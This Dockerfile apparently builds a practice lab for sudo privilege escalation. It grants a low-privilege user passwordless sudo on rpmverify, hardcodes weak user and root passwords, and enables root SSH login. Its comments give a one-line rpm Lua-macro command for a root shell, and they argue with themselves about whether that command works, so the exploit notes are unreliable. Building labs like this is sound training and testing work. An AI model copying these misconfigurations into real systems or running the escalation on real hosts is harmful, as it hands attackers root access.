FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_rpmverify
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/rpmverify as root
# Note: rpmverify is part of the rpm package. On Debian, the rpm tools are
# available but operate in a limited capacity. The exploit uses rpm's
# --eval macro expansion to execute arbitrary commands:
#   sudo rpmverify --eval '%(/bin/sh 1>&2)'
# Actually rpmverify doesn't support --eval, but rpm does. The binary
# that supports --eval is /usr/bin/rpm. However, the scenario specifically
# says rpmverify. In GTFOBins, the rpm/rpmverify exploit uses:
#   sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
# For rpmverify specifically, we can use the same lua macro approach.
# Let's use a wrapper or symlink approach, or just use rpm directly
# since rpmverify may not exist as a separate binary on Debian.
# On Debian, `rpm` package provides /usr/bin/rpm, /usr/bin/rpmverify, etc.
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and rpm tools
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        rpm \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Check if rpmverify exists; if not, it may be named differently on Debian
# On Debian, the rpm package provides /usr/bin/rpmverify or we may need to
# create a symlink. Let's check and handle accordingly.
RUN if [ ! -f /usr/bin/rpmverify ]; then \
        # On some Debian versions, rpmverify is a symlink or alias to rpm --verify \
        # Create it as a symlink to rpm since rpm handles the --eval flag \
        ln -s /usr/bin/rpm /usr/bin/rpmverify; \
    fi && \
    ls -la /usr/bin/rpmverify && \
    ls -la /usr/bin/rpm

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# Allow lowpriv to run rpmverify as root without password.
# Exploit: sudo rpmverify --eval '%{lua:os.execute("/bin/sh")}'
# This spawns a root shell via RPM's Lua macro expansion.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/rpmverify" > /etc/sudoers.d/rpmverify && \
    chmod 440 /etc/sudoers.d/rpmverify

# Verify sudo configuration is valid
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]